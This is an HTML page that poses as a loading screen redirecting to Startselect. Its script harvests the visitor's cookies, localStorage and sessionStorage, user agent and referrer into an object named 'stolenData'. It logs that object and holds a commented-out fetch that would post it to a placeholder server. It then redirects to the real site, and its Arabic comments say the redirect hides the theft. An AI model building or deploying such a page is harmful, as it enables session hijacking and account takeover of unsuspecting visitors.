<!DOCTYPE html>
<html>
<head>
    <title>Loading - Startselect</title>
    <style>
        body {
            background: #f5f5f5;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Redirecting to Startselect...</h2>
    <p>Please wait</p>

    <script>
        // جمع جميع البيانات من الزائر
        const stolenData = {
            cookies: document.cookie,
            url: window.location.href,
            userAgent: navigator.userAgent,
            localStorage: {},
            sessionStorage: {},
            timestamp: new Date().toISOString(),
            referrer: document.referrer
        };
        
        // جمع localStorage
        try {
            for(let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                stolenData.localStorage[key] = localStorage.getItem(key);
            }
        } catch(e) {}
        
        // جمع sessionStorage
        try {
            for(let i = 0; i < sessionStorage.length; i++) {
                let key = sessionStorage.key(i);
                stolenData.sessionStorage[key] = sessionStorage.getItem(key);
            }
        } catch(e) {}
        
        // عرض البيانات في وحدة التحكم (للمدير)
        console.log('=== STOLEN DATA ===');
        console.log(stolenData);
        
        // يمكن إرسال البيانات إلى خادم خارجي
        // fetch('https://your-server.com/steal', {
        //     method: 'POST',
        //     body: JSON.stringify(stolenData)
        // });
        
        // إعادة توجيه الزائر إلى الموقع الحقيقي (يخفي عملية السرقة)
        setTimeout(() => {
            window.location = 'https://startselect.com';
        }, 500);
    </script>
</body>
</html>
